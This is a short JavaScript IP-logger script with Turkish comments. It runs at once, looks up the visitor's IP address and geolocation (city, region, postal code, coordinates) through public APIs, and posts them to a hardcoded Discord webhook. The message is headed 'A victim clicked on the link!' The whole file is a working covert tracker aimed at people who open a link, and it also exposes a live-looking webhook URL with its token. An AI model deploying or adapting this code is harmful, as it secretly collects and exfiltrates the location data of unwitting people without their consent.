const sendIP = async () => {
  try {
    // Kullanıcının IP'sini al
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const ipadd = ipData.ip;

    // IP üzerinden coğrafi bilgileri al
    const geoResponse = await fetch(`https://ipapi.co/${ipadd}/json/`);
    const geoData = await geoResponse.json();

    // Discord webhook URL
    const dscURL = 'https://discord.com/api/webhooks/1440730235438891118/rnJxsWoS4KsgeGdBmOsC_EBZAX6hphP0HqZ-Atczj6oQBmT3eyT87iHMOuQKgKvj34Db';

    // Webhook’a POST
    const dscResponse = await fetch(dscURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: "snooby logger:3",
        avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
        content: "@here",
        embeds: [
          {
            title: 'A victim clicked on the link!',
            description: `**IP Address >>** ${ipadd}\n**Network >>** ${geoData.network || 'N/A'}\n**City >>** ${geoData.city || 'N/A'}\n**Region >>** ${geoData.region || 'N/A'}\n**Country >>** ${geoData.country_name || 'N/A'}\n**Postal Code >>** ${geoData.postal || 'N/A'}\n**Latitude >>** ${geoData.latitude || 'N/A'}\n**Longitude >>** ${geoData.longitude || 'N/A'}`,
            color: 0x800080
          }
        ]
      })
    });

    if (dscResponse.ok) {
      console.log('Sent! <3');
    } else {
      console.log('Failed :(');
    }

  } catch (error) {
    console.error('Error:', error);
  }
};

// Hemen çalıştır
sendIP();
